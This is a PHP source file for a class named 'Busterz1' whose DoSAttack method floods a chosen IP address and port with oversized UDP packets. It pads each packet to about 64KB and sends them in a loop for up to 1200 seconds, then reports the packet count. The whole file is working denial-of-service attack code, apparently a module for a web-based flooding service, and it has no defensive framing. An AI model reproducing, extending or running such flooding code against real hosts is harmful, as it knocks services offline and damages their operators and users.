<?php
if(!defined('priv')){
	die('Direct Access not allowed.');
}

class Busterz1{
	private $mintime = 1; //minimum flooding time
	private $maxtime = 1200; //maximum flooding time
	private $deftime = 10; //default flooding time

	public function displayVal($val){
		switch($val){
			case 'mintime':
				return $this->mintime;
			case 'maxtime':
				return $this->maxtime;
			case 'deftime':
				return $this->deftime;
			default:
				return 'Error: invalid val being called.';
		}
	}

	private function buildOutput($code, $h = null, $p = null, $t = null, $pktno = null){
		switch($code){
			case 'host_error':
				return 'Give me a valid IP, please.';
			case 'port_error':
				return 'Give me a valid Port, please.';
			case 'time_error':
				return 'Minimum time is: '.$this->mintime.', Maximum time is: '.$this->maxtime.'.';
			case 'success':
				return 'Successfully flooded '.$h.':'.$p.' for '.$t.' seconds; sent '.$pktno.' packets.';
		}
	}

	private function genHugePkt(){
		$pkt = 'X';
		for($i=0;$i<65535;$i++){
			$pkt .= 'X';
		}
		return $pkt;
	}

	private function genRandStr($length = 10) {
	    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
	}

	private function buildPacket($pkt){
		$pkt = str_replace('!hugepkt!', $this->genHugePkt(), $pkt);
		$pkt = str_replace('!rand!', $this->genRandStr(rand(10,20)), $pkt);
		$pkt .= "\r\nUsing https://github.com/lulzamp/Busterz1.class.php";
		return $pkt;
	}

	public function DoSAttack($h, $p, $t, $packet){
		if(!filter_var($h, FILTER_VALIDATE_IP)){
			return $this->buildOutput('host_error');
		}
		if($p > 65535 || $p < 1){
			return $this->buildOutput('port_error');
		}
		if($t > $this->maxtime || $t < $this->mintime){
			return $this->buildOutput('time_error');
		}
		$packet = $this->buildPacket($packet);
		
		$i = 0;
		$fp = fsockopen('udp://'.$h, $p, $errno, $errstr);
		$exec_time = time() + $t;
		while(1){
			if(time() == $exec_time){
				return $this->buildOutput('success', $h, $p, $t, $i);
			}

			$sent = fwrite($fp, $packet);
			if($sent){
				$i++;
			}
		}
	}
}
